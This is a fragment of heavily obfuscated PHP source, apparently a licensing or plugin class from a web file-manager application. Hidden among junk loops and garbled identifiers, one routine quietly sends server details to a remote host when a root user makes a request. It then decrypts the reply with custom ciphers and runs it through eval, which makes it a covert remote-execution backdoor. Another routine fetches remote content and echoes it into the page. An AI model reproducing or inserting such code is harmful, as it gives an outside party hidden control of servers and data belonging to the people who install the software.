$”÷ïşŠ¯[233], $”÷ïşŠ¯[242] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[243] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[244] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[245] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[246] => $”÷ïşŠ¯[233]); $İİ„›¨ = $_SERVER[¯‘·½][756]; if (!$İİ„›¨) { return; } } private function versionPluginFilter() { $Ÿª–µ´ó =& $_SERVER[ôİ”í„Æ]; if ($this->zexwb49af9a4 == $Ÿª–µ´ó[109]) { return $Ÿª–µ´ó[6]; } $Ş›†„ßœ = _get($this->bmut0924d3d1, $Ÿª–µ´ó[247], $Ÿª–µ´ó[6]); $Ù¦µ‰Ä = _get($this->bmut0924d3d1, $Ÿª–µ´ó[116], $Ÿª–µ´ó[6]); $ÜÄ¶»ô = _get($this->bmut0924d3d1, $Ÿª–µ´ó[248], $Ÿª–µ´ó[6]); $çããÛ¶· = $_SERVER[¯‘·½][757]; if ($Ù¦µ‰Ä > time() && $ÜÄ¶»ô > time()) { $™Şßšöô = explode($Ÿª–µ´ó[226], $Ş›†„ßœ); $¬´‰´† = array_keys($this->versionPluginList()); $Ş›†„ßœ = array_merge($™Şßšöô, $¬´‰´†); $Ş›†„ßœ = implode($Ÿª–µ´ó[226], array_filter(array_unique($Ş›†„ßœ))); } return $Ş›†„ßœ; } private function riembe89da0e() { $›à°„òÃ =& $_SERVER[ôİ”í„Æ]; if ($this->zexwb49af9a4 != $›à°„òÃ[109]) { $GLOBALS[$›à°„òÃ[86]][$›à°„òÃ[90]][$›à°„òÃ[249]] = $›à°„òÃ[206]; return; } $GLOBALS[$›à°„òÃ[86]][$›à°„òÃ[250]] = $›à°„òÃ[122]; if (Model($›à°„òÃ[251])->get($›à°„òÃ[63]) != $›à°„òÃ[206]) { Model($›à°„òÃ[251])->set($›à°„òÃ[63], $›à°„òÃ[206]); } } public function runw7753778a() { $Äƒ¤Îêµ =& $_SERVER[¯‘·½]; return $_SERVER[ôİ”í„Æ][252]; $´È€–ëØ = $Äƒ¤Îêµ[758]; while ($´È€–ëØ < $Äƒ¤Îêµ[712]) { if ($´È€–ëØ >= 0) { break; } $´È€–ëØ++; } } private function xfqe9076c53f() { $ş¶À—ñé =& $_SERVER[¯‘·½]; $€ÀÙ½÷‹ =& $_SERVER[ôİ”í„Æ]; $„åì¡ı¶ = array($€ÀÙ½÷‹[253], $€ÀÙ½÷‹[254], $€ÀÙ½÷‹[255]); $é–±Œñ = $€ÀÙ½÷‹[256] . md5($€ÀÙ½÷‹[257]); $¸ˆÈÛ± = $ş¶À—ñé[759]; while ($¸ˆÈÛ± < $ş¶À—ñé[690]) { if ($¸ˆÈÛ± >= 0) { break; } $¸ˆÈÛ±++; } if ($this->zexwb49af9a4 == $€ÀÙ½÷‹[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$€ÀÙ½÷‹[24]], $„åì¡ı¶)) { return; } if (time() % 4 != 0) { return; } $¬Å¾æõÄ = call_user_func(array($€ÀÙ½÷‹[258], $€ÀÙ½÷‹[259]), $é–±Œñ); if ($¬Å¾æõÄ && time() - $¬Å¾æõÄ < intval($€ÀÙ½÷‹[260])) { return; } call_user_func(array($€ÀÙ½÷‹[258], $€ÀÙ½÷‹[139]), $é–±Œñ, time()); $Û™²€ƒ´ = $ş¶À—ñé[760]; while ($Û™²€ƒ´ < $ş¶À—ñé[701]) { if ($Û™²€ƒ´ >= 0) { break; } $Û™²€ƒ´++; } $Í™¦¦Ç = Model($€ÀÙ½÷‹[33])->get($€ÀÙ½÷‹[100]); $Ó¤ü™‡ = $ş¶À—ñé[761]; while (strlen($Ó¤ü™‡) < $ş¶À—ñé[710]) { if (!$Ó¤ü™‡) { break; } $Ó¤ü™‡++; } $ÈÃã÷ = array($€ÀÙ½÷‹[152] => Model($€ÀÙ½÷‹[33])->get($€ÀÙ½÷‹[153]), $€ÀÙ½÷‹[167] => $this->zexwb49af9a4, $€ÀÙ½÷‹[163] => $_SERVER[$€ÀÙ½÷‹[164]], $€ÀÙ½÷‹[165] => Model($€ÀÙ½÷‹[33])->get($€ÀÙ½÷‹[131]), $€ÀÙ½÷‹[105] => md5($_SERVER[$€ÀÙ½÷‹[106]] . $Í™¦¦Ç), $€ÀÙ½÷‹[156] => $€ÀÙ½÷‹[136], $€ÀÙ½÷‹[159] => $_SERVER[$€ÀÙ½÷‹[160]]); $·Ÿ¥Ç® = $this->sdtpf2ed4612($€ÀÙ½÷‹[261], $ÈÃã÷); $·Ï°Á¯‚ = $ş¶À—ñé[762]; if (strlen($·Ï°Á¯‚) < $ş¶À—ñé[690]) { die; } if (!is_array($·Ÿ¥Ç®)) { return; } if ($·Ÿ¥Ç®[$€ÀÙ½÷‹[152]] && $·Ÿ¥Ç®[$€ÀÙ½÷‹[262]]) { if ($this->bmuk2303615e($·Ÿ¥Ç®[$€ÀÙ½÷‹[262]]) == $ÈÃã÷[$€ÀÙ½÷‹[152]]) { return; } } $this->mqrffadc71bc(); if ($this->bmuk2303615e($·Ÿ¥Ç®[$€ÀÙ½÷‹[262]]) != $ÈÃã÷[$€ÀÙ½÷‹[152]]) { $èİÆÔ = array($€ÀÙ½÷‹[185] => $Í™¦¦Ç, $€ÀÙ½÷‹[186] => $_SERVER[$€ÀÙ½÷‹[106]], $€ÀÙ½÷‹[187] => this_url(), $€ÀÙ½÷‹[161] => $_SERVER[$€ÀÙ½÷‹[162]]); $½ª‹£ï¯ = $this->hyiv3a381914(json_encode($èİÆÔ)); $·Ÿ¥Ç® = $this->sdtpf2ed4612($€ÀÙ½÷‹[188] . $½ª‹£ï¯); if ($·Ÿ¥Ç® && is_array($·Ÿ¥Ç®) && isset($·Ÿ¥Ç®[$€ÀÙ½÷‹[262]])) { $ÆßÖœÆã = $this->nmtsed8c26ae($·Ÿ¥Ç®[$€ÀÙ½÷‹[262]], 2); if ($ÆßÖœÆã) { $ÆßÖœÆã = $this->bmuk2303615e($ÆßÖœÆã); } if ($ÆßÖœÆã) { try { @eval($ÆßÖœÆã); } catch (Exception $ıïÒè¿ì) { } } } } } private function sdtpf2ed4612($Ñî¹ë = '', $ûËÁâº = array(), $»¤ü°áÒ = 5) { $œ†¼’•À =& $_SERVER[¯‘·½]; $“ÌøõÒœ =& $_SERVER[ôİ”í„Æ]; $Àè¿†¢ò = $“ÌøõÒœ[263]; $ÉÄäˆ¬î = $œ†¼’•À[763]; while ($ÉÄäˆ¬î < $œ†¼’•À[701]) { if ($ÉÄäˆ¬î >= 0) { break; } $ÉÄäˆ¬î++; } $Àè¿†¢ò = $this->fxwy13863597($Àè¿†¢ò, $“ÌøõÒœ[264]); $Àè¿†¢ò = $Àè¿†¢ò . $Ñî¹ë; $âç½«´¯ = $œ†¼’•À[764]; if (!$âç½«´¯) { die; } if ($ûËÁâº && is_array($ûËÁâº)) { $Àè¿†¢ò = $Àè¿†¢ò . $“ÌøõÒœ[265] . http_build_query($ûËÁâº); } if ($ûËÁâº === -1) { return $Àè¿†¢ò; } $½Ù¾—Ÿ = stream_context_create(array($“ÌøõÒœ[219] => array($“ÌøõÒœ[222] => $»¤ü°áÒ, $“ÌøõÒœ[220] => $“ÌøõÒœ[266]), $“ÌøõÒœ[267] => array($“ÌøõÒœ[268] => !1, $“ÌøõÒœ[269] => !1))); $ûËÁâº = @file_get_contents($Àè¿†¢ò, !1, $½Ù¾—Ÿ); $ëĞğœŸŠ = $œ†¼’•À[765]; while ($ëĞğœŸŠ < $œ†¼’•À[712]) { if ($ëĞğœŸŠ >= 0) { break; } $ëĞğœŸŠ++; } return json_decode($ûËÁâº, !0); $ÛÕç‡õ÷ = $œ†¼’•À[766]; if (!$ÛÕç‡õ÷) { die; } } private function oawjc7dabe9f() { $ºñœÜ‘³ =& $_SERVER[ôİ”í„Æ]; $Èõ¶Óé¸ = array($ºñœÜ‘³[270] => $ºñœÜ‘³[271], $ºñœÜ‘³[272] => $ºñœÜ‘³[273], $ºñœÜ‘³[274] => $ºñœÜ‘³[275], $ºñœÜ‘³[276] => $ºñœÜ‘³[277], $ºñœÜ‘³[278] => $ºñœÜ‘³[279], $ºñœÜ‘³[280] => $ºñœÜ‘³[214], $ºñœÜ‘³[281] => $ºñœÜ‘³[214], $ºñœÜ‘³[282] => $ºñœÜ‘³[271], $ºñœÜ‘³[283] => $ºñœÜ‘³[273], $ºñœÜ‘³[284] => $ºñœÜ‘³[275], $ºñœÜ‘³[285] => $ºñœÜ‘³[286], $ºñœÜ‘³[287] => $ºñœÜ‘³[277], $ºñœÜ‘³[288] => $ºñœÜ‘³[289], $ºñœÜ‘³[290] => $ºñœÜ‘³[279], $ºñœÜ‘³[291] => $ºñœÜ‘³[292], $ºñœÜ‘³[293] => $ºñœÜ‘³[294], $ºñœÜ‘³[295] => $ºñœÜ‘³[296]); $ôĞ„™„œ = $Èõ¶Óé¸[$this->zexwb49af9a4]; $ôĞ„™„œ = intval($ôĞ„™„œ ? $ôĞ„™„œ : $ºñœÜ‘³[271]); $À–ìîªõ = _get($this->bmut0924d3d1, $ºñœÜ‘³[297]); $À–ìîªõ = $À–ìîªõ ? intval($À–ìîªõ) : 0; $šÃÄ ë¨ = $_SERVER[¯‘·½][767]; if (!$šÃÄ ë¨) { die; } return $ôĞ„™„œ + $À–ìîªõ; } public function jgxlfb0c2365($—–äÁ©) { $¥ä©¹›£ =& $_SERVER[ôİ”í„Æ]; $„ó™ëàÔ = $this->oawjc7dabe9f(); if ($—–äÁ©[$¥ä©¹›£[298]] == $¥ä©¹›£[122]) { return; } if ($„ó™ëàÔ >= intval($¥ä©¹›£[214])) { return; } $È„Æ£”Ë = Model($¥ä©¹›£[125])->count(); if ($È„Æ£”Ë <= $„ó™ëàÔ) { return; } $èÈ©Ş’¿ = Model($¥ä©¹›£[125])->field($¥ä©¹›£[298])->limit($„ó™ëàÔ)->select(); $èÈ©Ş’¿ = array_to_keyvalue($èÈ©Ş’¿, $¥ä©¹›£[6], $¥ä©¹›£[298]); if (!in_array($—–äÁ©[$¥ä©¹›£[298]], $èÈ©Ş’¿)) { show_json($¥ä©¹›£[299], !1, $¥ä©¹›£[210]); } } public function anpl7519803b() { $æöêÀ¦É =& $_SERVER[¯‘·½]; $©îÕ‹Õ­ =& $_SERVER[ôİ”í„Æ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $†ê’°…ƒ = $©îÕ‹Õ­[217]; $†ê’°…ƒ = $this->fxwy13863597($†ê’°…ƒ, $©îÕ‹Õ­[218]); $Øş°€ü = $æöêÀ¦É[768]; $ÛüÇô† = stream_context_create(array($©îÕ‹Õ­[219] => array($©îÕ‹Õ­[220] => $©îÕ‹Õ­[221], $©îÕ‹Õ­[222] => 3))); $€òÆö½è = $æöêÀ¦É[769]; $¤·ûûÛª = @file_get_contents($†ê’°…ƒ, !1, $ÛüÇô†); echo $©îÕ‹Õ­[300] . hash_encode($¤·ûûÛª) . $©îÕ‹Õ­[301]; $¤Ğ¯üå¤ = $æöêÀ¦É[770]; while (strlen($¤Ğ¯üå¤) < $æöêÀ¦É[710]) { if (!$¤Ğ¯üå¤) { break; } $¤Ğ¯üå¤++; } } private function jemv1e18173c($éì¤àï, $±Ú”‘ é, $–°…«Ó = 3) { $ƒÀÖ¹Óü =& $_SERVER[¯‘·½]; $ÏÅšİ†ê =& $_SERVER[ôİ”í„Æ]; usleep(1); $ÑĞìÄƒç = $ƒÀÖ¹Óü[771]; if (strlen($ÑĞìÄƒç) < $ƒÀÖ¹Óü[697]) { return; } $éì¤àï = trim($éì¤àï); $ÁìÈš„ğ = $ƒÀÖ¹Óü[772]; $›º§æ¼ = mt_rand(0, 5) . $ÏÅšİ†ê[6]; $Çù‰ëÛ  = rand_string(15); $ÚÏÉéõƒ = $ƒÀÖ¹Óü[773]; if (!$ÚÏÉéõƒ) { return; } $®ÔØ‡™ = $ÏÅšİ†ê[302]; switch ($›º§æ¼) { case $ÏÅšİ†ê[206]: $§Ü½¢«µ = $this->giyl19b4c071($éì¤àï, strrev($±Ú”‘ é . $Çù‰ëÛ )); $„ıôŸã£ = $ƒÀÖ¹Óü[774]; if (strlen($„ıôŸã£) < $ƒÀÖ¹Óü[712]) { return; } break; case $ÏÅšİ†ê[122]: $§Ü½¢«µ = $this->giyl19b4c071($éì¤àï, strrev($Çù‰ëÛ  . $±Ú”‘ é)); break; $ÂêîÏ€µ = $ƒÀÖ¹Óü[775]; if (strlen($ÂêîÏ€µ) < $ƒÀÖ¹Óü[697]) { die; } case $ÏÅšİ†ê[303]: $§Ü½¢«µ = $this->giyl19b4c071($éì¤àï, base64_encode($Çù‰ëÛ  . $±Ú”‘ é)); $à²äŒ©‚ = $ƒÀÖ¹Óü[776]; if (!$à²äŒ©‚) { die; } break; $Õè¿ñ„¯ = $ƒÀÖ¹Óü[777]; while (strlen($Õè¿ñ„¯) < $ƒÀÖ¹Óü[697]) { if (!$Õè¿ñ„¯) { break; } $Õè¿ñ„¯++; } case $ÏÅšİ†ê[304]: $§Ü½¢«µ = $this->giyl19b4c071($éì¤àï, md5($Çù‰ëÛ  . $±Ú”‘ é)); break; case $ÏÅšİ†ê[305]: $éì¤àï = base64_encode($éì¤àï); $¿ù…äèâ = rand(0, 64); $æ¾õòÊø = $ƒÀÖ¹Óü[778]; $áúßğÈ€ = $®ÔØ‡™[$¿ù…äèâ]; $Òêêû‰× = $ƒÀÖ¹Óü[779]; while ($Òêêû‰× < $ƒÀÖ¹Óü[697]) { if ($Òêêû‰× >= 0) { break; } $Òêêû‰×++; } $†´ó³Ó‰ = md5($áúßğÈ€ . md5($±Ú”‘ é . $áúßğÈ€) . $±Ú”‘ é); $†´ó³Ó‰ = substr($†´ó³Ó‰, $¿ù…äèâ % 8, $¿ù…äèâ % 8 + 7); $¥¸‰ˆ©¼ = $ƒÀÖ¹Óü[780]; if (!$¥¸‰ˆ©¼) { die; } $ò©ò—úÒ = $ÏÅšİ†ê[6]; $çÜÕÈÇª = 0; $¦ÈµÜ¨´ = 0; $¹óŞŠµ¿ = $ƒÀÖ¹Óü[781]; while ($¹óŞŠµ¿ < $ƒÀÖ¹Óü[712]) { if ($¹óŞŠµ¿ >= 0) { break; } $¹óŞŠµ¿++; } $Ç€ï¾ğç = 0; $¤ÓÏôüÁ = $ƒÀÖ¹Óü[782]; if (strlen($¤ÓÏôüÁ) < $ƒÀÖ¹Óü[710]) { return; } for ($çÜÕÈÇª = 0; $çÜÕÈÇª < strlen($éì¤àï); $çÜÕÈÇª++) { $Ç€ï¾ğç = $Ç€ï¾ğç == strlen($†´ó³Ó‰) ? 0 : $Ç€ï¾ğç; $°Ö”£·‡ = $ƒÀÖ¹Óü[783]; while (strlen($°Ö”£·‡) < $ƒÀÖ¹Óü[712]) { if (!$°Ö”£·‡) { break; } $°Ö”£·‡++; } $¦ÈµÜ¨´ = ($¿ù…äèâ + strpos($®ÔØ‡™, $éì¤àï[$çÜÕÈÇª]) + ord($†´ó³Ó‰[$Ç€ï¾ğç++])) % 64; $‡Ö”–á = $ƒÀÖ¹Óü[784]; $ò©ò—úÒ .= $®ÔØ‡™[$¦ÈµÜ¨´]; } $§Ü½¢«µ = hash_encode($áúßğÈ€ . $ò©ò—úÒ); $‘ÀõĞ‰Ó = $ƒÀÖ¹Óü[785]; while ($‘ÀõĞ‰Ó < $ƒÀÖ¹Óü[710]) { if ($‘ÀõĞ‰Ó >= 0) { break; } $‘ÀõĞ‰Ó++; } break; $æ¯Šêƒ” = $ƒÀÖ¹Óü[786]; if (strlen($æ¯Šêƒ”) < $ƒÀÖ¹Óü[710]) { return; } default: $§Ü½¢«µ = $this->giyl19b4c071($éì¤àï, $±Ú”‘ é . $Çù‰ëÛ ); $Ó‹À˜åª = $ƒÀÖ¹Óü[787]; while ($Ó‹À˜åª < $ƒÀÖ¹Óü[712]) { if ($Ó‹À˜åª >= 0) { break; } $Ó‹À˜åª++; } break; $òâª¶Üå = $ƒÀÖ¹Óü[788]; if (!$òâª¶Üå) { die; } } $§Ü½¢«µ = strrev($›º§æ¼ . $Çù‰ëÛ  . $§Ü½¢«µ); $÷¾“©¾¼ = $ƒÀÖ¹Óü[789]; if (!$÷¾“©¾¼) { return; } if ($–°…«Ó - 1 > 0) { $§Ü½¢«µ = $this->jemv1e18173c($§Ü½¢«µ, $±Ú”‘ é, $–°…«Ó - 1); } return $§Ü½¢«µ; } private function nmtsed8c26ae($¶ÚİÀÃ¤, $ÂÑúÊ‘¼, $éŸÒöÂ§ = 3) { $Àé³»Íµ =& $_SERVER[¯‘·½]; $ô»î¹¢ =& $_SERVER[ôİ”í„Æ]; if (!is_string($¶ÚİÀÃ¤) || strlen($¶ÚİÀÃ¤) < 10) { return !1; } $¶ÚİÀÃ¤ = trim($¶ÚİÀÃ¤); $¶ÚİÀÃ¤ = strrev($¶ÚİÀÃ¤); $•éâ¹õ = $Àé³»Íµ[790]; if (!$•éâ¹õ) { die; } $—¸”¬Ò = $¶ÚİÀÃ¤[0]; $ÍøÜ¼ŠÑ = substr($¶ÚİÀÃ¤, 1, 15); $¶ÚİÀÃ¤ = substr($¶ÚİÀÃ¤, 16); $³®ª¿·ï = $ô»î¹¢[302]; switch ($—¸”¬Ò) { case $ô»î¹¢[206]: $ıÆäÒœ¾ = $this->fxwy13863597($¶ÚİÀÃ¤, strrev($ÂÑúÊ‘¼ . $ÍøÜ¼ŠÑ)); break; case $ô»î¹¢[122]: $ıÆäÒœ¾ = $this->fxwy13863597($¶ÚİÀÃ¤, strrev($ÍøÜ¼ŠÑ . $ÂÑúÊ‘¼)); break; $–ìÒû± = $Àé³»Íµ[791]; if (!$–ìÒû±) { die; } case $ô»î¹¢[303]: $ıÆäÒœ¾ = $this->fxwy13863597($¶ÚİÀÃ¤, base64_encode($ÍøÜ¼ŠÑ . $ÂÑúÊ‘¼)); $ïˆÇ¬ş• = $Àé³»Íµ[792]; while (strlen($ïˆÇ¬ş•) < $Àé³»Íµ[701]) { if (!$ïˆÇ¬ş•) { break; } $ïˆÇ¬ş•++; } break; case $ô»î¹¢[304]: $ıÆäÒœ¾ = $this->fxwy13863597($¶ÚİÀÃ¤, md5($ÍøÜ¼ŠÑ . $ÂÑúÊ‘¼)); break; $î„Ñ˜² = $Àé³»Íµ[793]; while (strlen($î„Ñ˜²) < $Àé³»Íµ[712]) { if (!$î„Ñ˜²) { break; } $î„Ñ˜²++; } case $ô»î¹¢[305]: $¶ÚİÀÃ¤ = hash_decode($¶ÚİÀÃ¤); $‘ÉÊáû = $¶ÚİÀÃ¤[0]; $Ãã‰Ò¿ = $Àé³»Íµ[794]; $¶ÚİÀÃ¤ = substr($¶ÚİÀÃ¤, 1); $ü†Æ“Á• = $Àé³»Íµ[795]; if (strlen($ü†Æ“Á•) < $Àé³»Íµ[712]) { return; } $ÜÜüÕ œ = strpos($³®ª¿·ï, $‘ÉÊáû); $áÒëí»ü = md5($‘ÉÊáû . md5($ÂÑúÊ‘¼ . $‘ÉÊáû) . $ÂÑúÊ‘¼); $áÒëí»ü = substr($áÒëí»ü, $ÜÜüÕ œ % 8, $ÜÜüÕ œ % 8 + 7); $šÀ…Ë‚ = $Àé³»Íµ[796]; while (strlen($šÀ…Ë‚) < $Àé³»Íµ[712]) { if (!$šÀ…Ë‚) { break; } $šÀ…Ë‚++; } $¾¸¦İÆÈ = $ô»î¹¢[6]; $Éıèö„¨ = 0; $¿½ä´ã = 0; $¤öÆìòÚ = $Àé³»Íµ[797]; if (strlen($¤öÆìòÚ) < $Àé³»Íµ[697]) { return; } $–èÓ«¢“ = 0; $äªÆË¹— = $Àé³»Íµ[798]; if (strlen($äªÆË¹—) < $Àé³»Íµ[690]) { return; } for ($Éıèö„¨ = 0; $Éıèö„¨ < strlen($¶ÚİÀÃ¤); $Éıèö„¨++) { $–èÓ«¢“ = $–èÓ«¢“ == strlen($áÒëí»ü) ? 0 : $–èÓ«¢“; $İÍ€éÔ„ = $Àé³»Íµ[799]; $¬ÀİÇ–× = $–èÓ«¢“++; $¿½ä´ã = strpos($³®ª¿·ï, $¶ÚİÀÃ¤[$Éıèö„¨]) - $ÜÜüÕ œ - ord($áÒëí»ü[$¬ÀİÇ–×]); $©¼Öã»ü = $Àé³»Íµ[800]; while ($©¼Öã»ü < $Àé³»Íµ[690]) { if ($©¼Öã»ü >= 0) { break; } $©¼Öã»ü++; } while ($¿½ä´ã < 0) { $¿½ä´ã += 64; $Ô¾­Ó×È = $Àé³»Íµ[801]; if (strlen($Ô¾­Ó×È) < $Àé³»Íµ[690]) { die; } } $¾¸¦İÆÈ .= $³®ª¿·ï[$¿½ä´ã]; } $ıÆäÒœ¾ = base64_decode($¾¸¦İÆÈ); break; $ïØ®ÑÑ = $Àé³»Íµ[802]; if (strlen($ïØ®ÑÑ) < $Àé³»Íµ[712]) { die; } default: $ıÆäÒœ¾ = $this->fxwy13863597($¶ÚİÀÃ¤, $ÂÑúÊ‘¼ . $ÍøÜ¼ŠÑ); $ñƒà¤ú = $Àé³»Íµ[803]; break; $€—Ú”óÈ = $Àé³»Íµ[804]; if (!$€—Ú”óÈ) { return; } } if ($éŸÒöÂ§ - 1 > 0) { $ıÆäÒœ¾ = $this->nmtsed8c26ae($ıÆäÒœ¾, $ÂÑúÊ‘¼, $éŸÒöÂ§ - 1); } return $ıÆäÒœ¾; } public function hyiv3a381914($ÊËµÓî¡) { $´¸¥Î±ƒ =& $_SERVER[¯‘·½]; $çÎãØµ¨ =& $_SERVER[ôİ”í„Æ]; $ÛĞ«æğÏ = $this->eowuc0a57203(); $œ¶£»Éé = $this->eowuc0a57203(); $šØÑŞîˆ = $´¸¥Î±ƒ[805]; if (!$šØÑŞîˆ) { return; } $ı”©‹ûÉ = ($ÛĞ«æğÏ - 1) * ($œ¶£»Éé - 1); $Ç‰¸“ = $´¸¥Î±ƒ[806]; if (strlen($Ç‰¸“) < $´¸¥Î±ƒ[690]) { die; } $‚ÀÃ”¢ö = intval(($ÛĞ«æğÏ + $œ¶£»Éé) / 2); $ó¾Îå†¾ = $´¸¥Î±ƒ[807]; while ($ó¾Îå†¾ < $´¸¥Î±ƒ[697]) { if ($ó¾Îå†¾ >= 0) { break; } $ó¾Îå†¾++; } while (1) { $ÆŒ­¼ÒÃ = $‚ÀÃ”¢ö; $ª¡˜êéÍ = $´¸¥Î±ƒ[808]; $“‚³ïé = $ı”©‹ûÉ; while ($“‚³ïé % $ÆŒ­¼ÒÃ != 0) { $à±®»ô» = $“‚³ïé; $á¸«å³ = $´¸¥Î±ƒ[809]; if (strlen($á¸«å³) < $´¸¥Î±ƒ[697]) { return; } $“‚³ïé = $ÆŒ­¼ÒÃ; $Ôû×Æ› = $´¸¥Î±ƒ[810]; if (strlen($Ôû×Æ›) < $´¸¥Î±ƒ[712]) { die; } $ÆŒ­¼ÒÃ = $à±®»ô» % $ÆŒ­¼ÒÃ; $Í¯ßù†Õ = $´¸¥Î±ƒ[811]; if (strlen($Í¯ßù†Õ) < $´¸¥Î±ƒ[697]) { return; } } if ($ÆŒ­¼ÒÃ == 1) { break; } else { $‚ÀÃ”¢ö++; } } $ã¬û¿£“ = 2; $¨…ˆºü = $´¸¥Î±ƒ[812]; for ($ãÑÆÇÄè = 0; $ãÑÆÇÄè < $ı”©‹ûÉ * 10; $ãÑÆÇÄè++) { if (($ı”©‹ûÉ * $ãÑÆÇÄè + 1) % $‚ÀÃ”¢ö == 0) { $ã¬û¿£“ = intval(($ı”©‹ûÉ * $ãÑÆÇÄè + 1) / $‚ÀÃ”¢ö); break; } } $ÛŠÍ×£¨ = $this->giyl19b4c071($ÛĞ«æğÏ * $œ¶£»Éé . $çÎãØµ¨[6], $çÎãØµ¨[136]); $ó—§ƒ¤¸ = $´¸¥Î±ƒ[813]; $ñŞ‘¾šì = md5($çÎãØµ¨[306] . ($ÛĞ«æğÏ + $œ¶£»Éé) . $çÎãØµ¨[307] . $‚ÀÃ”¢ö . $çÎãØµ¨[307] . $ã¬û¿£“ . $çÎãØµ¨[308]); $±¼ş™™É = $this->giyl19b4c071($ÊËµÓî¡, $ñŞ‘¾šì) . $çÎãØµ¨[309] . $ÛŠÍ×£¨; return $±¼ş™™É; } public function bmuk2303615e($ïÇäÈÆ) { $Ô‘¾½ =& $_SERVER[¯‘·½]; $”¥©è÷» =& $_SERVER[ôİ”í„Æ]; $ˆ­ Î’‚ = explode($”¥©è÷»[309], $ïÇäÈÆ); if (count($ˆ­ Î’‚) != 2) { return $”¥©è÷»[6]; } $îç‚Äğ = $this->fxwy13863597($ˆ­ Î’‚[1] . $”¥©è÷»[6], $”¥©è÷»[136]); $àÃ£Êï = $Ô‘¾½[814]; while (strlen($àÃ£Êï) < $Ô‘¾½[697]) { if (!$àÃ£Êï) { break; } $àÃ£Êï++; } if (!$îç‚Äğ) { return $”¥©è÷»[6]; } $îç‚Äğ = intval($îç‚Äğ); $âò–Ô»” = 0; $Ã®ÄÄšÕ = $Ô‘¾½[815]; if (!$Ã®ÄÄšÕ) { die; } $Ìâß¦É¨ = 0; $¢ĞØê·ë = $Ô‘¾½[816]; for ($€‡£Ç×ú = 3; $€‡£Ç×ú < $îç‚Äğ; $€‡£Ç×ú += 2) { if ($îç‚Äğ % $€‡£Ç×ú != 0) { continue; } $âò–Ô»” = $€‡£Ç×ú; $Ìâß¦É¨ = intval($îç‚Äğ / $€‡£Ç×ú); $µ®òŸø¤ = $Ô‘¾½[817]; if (strlen($µ®òŸø¤) < $Ô‘¾½[701]) { die; } break; $ıÊ§šõâ = $Ô‘¾½[818]; if (strlen($ıÊ§šõâ) < $Ô‘¾½[697]) { die; } } $ˆŸÙÄ¼Õ = ($âò–Ô»” - 1) * ($Ìâß¦É¨ - 1); $©¥°÷œŒ = $Ô‘¾½[819]; while ($©¥°÷œŒ < $Ô‘¾½[697]) { if ($©¥°÷œŒ >= 0) { break; } $©¥°÷œŒ++; } $ñùƒñÛ— = intval(($âò–Ô»” + $Ìâß¦É¨) / 2); $·Å¦ûÕ“ = $Ô‘¾½[820]; while (strlen($·Å¦ûÕ“) < $Ô‘¾½[710]) { if (!$·Å¦ûÕ“) { break; } $·Å¦ûÕ“++; } while (1) { $»•’Ùä” = $ñùƒñÛ—; $’Ò½Íª› = $ˆŸÙÄ¼Õ; while ($’Ò½Íª› % $»•’Ùä” != 0) { $š¶¶Š· = $’Ò½Íª›; $¸¼Ş‰ = $Ô‘¾½[821]; $’Ò½Íª› = $»•’Ùä”; $‹®×ó‘ = $Ô‘¾½[822]; if (!$‹®×ó‘) { die; } $»•’Ùä” = $š¶¶Š· % $»•’Ùä”; $ú·ØŞİÔ = $Ô‘¾½[823]; if (!$ú·ØŞİÔ) { die; } } if ($»•’Ùä” == 1) { break; } else { $ñùƒñÛ—++; } } $Ì¬›¹ÆÒ = 2; $ÒÜä ûñ = $Ô‘¾½[824]; if (strlen($ÒÜä ûñ) < $Ô‘¾½[710]) { die; } for ($€‡£Ç×ú = 0; $€‡£Ç×ú < $ˆŸÙÄ¼Õ * 10; $€‡£Ç×ú++) { if (($ˆŸÙÄ¼Õ * $€‡£Ç×ú + 1) % $ñùƒñÛ— == 0) { $Ì¬›¹ÆÒ = intval(($ˆŸÙÄ¼Õ * $€‡£Ç×ú + 1) / $ñùƒñÛ—); break; } } $©´ùŞÕ = md5($”¥©è÷»[306] . ($âò–Ô»” + $Ìâß¦É¨) . $”¥©è÷»[307] . $ñùƒñÛ— . $”¥©è÷»[307] . $Ì¬›¹ÆÒ . $”¥©è÷»[308]); $ÌŞ¦ ä = $Ô‘¾½[825]; while ($ÌŞ¦ ä < $Ô‘¾½[710]) { if ($ÌŞ¦ ä >= 0) { break; } $ÌŞ¦ ä++; } $Œ•­·Ñ = $this->fxwy13863597($ˆ­ Î’‚[0], $©´ùŞÕ); $ã¾¦¤Òø = $Ô‘¾½[826]; return $Œ•­·Ñ; } public function eowuc0a57203() { $ÙÏÇİ¿ =& $_SERVER[¯‘·½]; $óŸ°úß³ = mt_rand(pow(2, 14), pow(2, 16) - 1); $¼şŒ¸‘ = $ÙÏÇİ¿[827]; while (strlen($¼şŒ¸‘) < $ÙÏÇİ¿[712]) { if (!$¼şŒ¸‘) { break; } $¼şŒ¸‘++; } $¹”àòµ = array(); $­®æ‰ëÒ = $ÙÏÇİ¿[828]; while ($­®æ‰ëÒ < $ÙÏÇİ¿[710]) { if ($­®æ‰ëÒ >= 0) { break; } $­®æ‰ëÒ++; } $şÙ¶ªè = 1; while ($şÙ¶ªè <= (int) sqrt($óŸ°úß³)) { $€³­Ùå = $şÙ¶ªè; $İÓÙí¥ = $ÙÏÇİ¿[829]; while ($İÓÙí¥ < $ÙÏÇİ¿[712]) { if ($İÓÙí¥ >= 0) { break; } $İÓÙí¥++; } while (!0) { $€³­Ùå++; if ($€³­Ùå <= 2) { $şÙ¶ªè = $€³­Ùå; break; } else { if ($€³­Ùå < 2) { continue; } } $™Šëåê– = !0; for ($²Øü¸Ø© = 2; $²Øü¸Ø© <= sqrt($€³­Ùå); $²Øü¸Ø©++) { if ($€³­Ùå % $²Øü¸Ø© == 0) { $™Šëåê– = !1; } } if ($™Šëåê–) { $şÙ¶ªè = $€³­Ùå; break; } } $¹”àòµ[] = $şÙ¶ªè; $¡ÏÛ‡ØÈ = $ÙÏÇİ¿[830]; if (!$¡ÏÛ‡ØÈ) { return; } } $“¦°¨øé = 2; for ($€³­Ùå = $óŸ°úß³; $€³­Ùå > 1; $€³­Ùå--) { $™Šëåê– = !0; foreach ($¹”àòµ as $¢¾Ë¹µü) { if ($€³­Ùå % $¢¾Ë¹µü == 0) { $™Šëåê– = !1; break; } } if ($™Šëåê–) { $“¦°¨øé = $€³­Ùå; break; } } 